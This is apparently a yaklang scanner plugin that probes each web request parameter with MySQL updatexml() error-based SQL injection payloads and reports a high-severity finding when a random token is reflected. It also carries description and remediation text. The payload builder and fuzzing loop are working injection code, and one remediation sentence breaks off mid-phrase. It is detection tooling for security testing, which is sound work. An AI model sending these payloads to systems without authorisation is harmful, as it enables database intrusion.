buildUpdateXML = (pre, suf) => {
    rand1 := randstr(10)
    rand2 := randstr(10)
    token := rand1 + rand2

    p1 = "and updatexml(1, concat(0x307e,"
    payload = f"0x${codec.EncodeToHex(rand1)}, " + f`0x${codec.EncodeToHex(rand2)}`
    p2 = "), 1)"
    return pre+ p1 + payload + p2 + suf, token
}

desc = `
error injection attack is that the attacker uses the error information generated by the database system when processing queries to obtain internal information of the database. In any database system, this attack is possible if an attacker is able to cause a database error by injecting a malicious SQL fragment and the error message is returned to the client.

protection measures are similar to MySQL, including but not limited to:

1. Use prepared statements and parameterized queries to prevent injection.
2. Implement strict error handling and do not disclose detailed error information to users.
3. Perform strict validation of user input.
4. Limit the permissions of database accounts to avoid unnecessary database operation permissions.
5. Use a web application firewall (WAF) to identify and block SQL injection attacks.
6. Conduct regular security audits and penetration testing.

Keeping database software and applications updated is also an important measure to prevent vulnerabilities from being exploited.
`
solution = ``
fixDesc = `
1. Use prepared statements and parameterized queries: This is an effective way to prevent SQL injection attacks. Prepared statements and parameterized queries ensure that user input is correctly interpreted as literal values and not part of an SQL command.
2. Implement strict error handling: Detailed error information should not be exposed to users to prevent attackers from using this information to understand the database structure and construct effective SQL injection attacks. The key to the
3. Strict validation of user input: All user input should be treated as potential attack payloads and subject to strict validation and sanitization.
4. Limit the permissions of database accounts: Database accounts should only have the minimum permissions necessary to perform the tasks they require. This reduces what an attacker can do after successfully injecting a SQL command.
5. Use a Web Application Firewall (WAF): A WAF can help identify and block SQL injection attacks, adding an extra layer of defense.
6. Conduct regular security audits and penetration testing: This can help detect and fix any vulnerabilities that may be exploited by attackers.
7. Keep database software and applications updated: This is an important measure to prevent vulnerabilities from being exploited, because many updates contain fixes for known vulnerabilities. `

# mirrorNewWebsitePathParams Each time a new website path appears with some parameters, the parameters pass through common locations and parameter names Deduplication, the first HTTPFlow deduplication is called here. The
mirrorNewWebsitePathParams = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    freq = fuzz.HTTPRequest(req, fuzz.https(isHttps))~
    for param in freq.GetCommonParams() {
        val := param.GetFirstValue()
        isNum = str.IsDigit(val)
        var suffix = [" -- ", "#"]
        var prefix = []
        if isNum {
            prefix.Push(f`${val}/**/`)
            prefix.Push(f`${val}'/**/`)
        } else {
            prefix.Push(f`${val}'`)
            prefix.Push(f`${val}')`)
            prefix.Push(f`${val}'))`)
        }

        for suf in suffix {
            for pre in prefix {
                payload, token := buildUpdateXML(pre, suf)
                result, err := param.Fuzz(payload).ExecFirst()
                if err != nil { continue }

                if string(result.ResponseRaw).Contains(token) {
                    risk.NewRisk(
                        url,
                        risk.severity("high"),
                        risk.type("sqlinjection"),
                        risk.title(f"MySQL UpdateXML Error-Based Injection: ${url}"),
                        risk.titleVerbose(f"SQL Error Injection (UpdateXML):: ${url}"),
                        risk.parameter(f`Param: ${param.Name()} OriginValue: ${val}`),
                        risk.payload(f`Payload: ${payload} Check-Token: ${token}`),
                        risk.request(result.RequestRaw),
                        risk.response(result.ResponseRaw),
                        risk.description(desc),
                        risk.solution(solution),
                    )
                    return
                }
            }
        }
    }
}

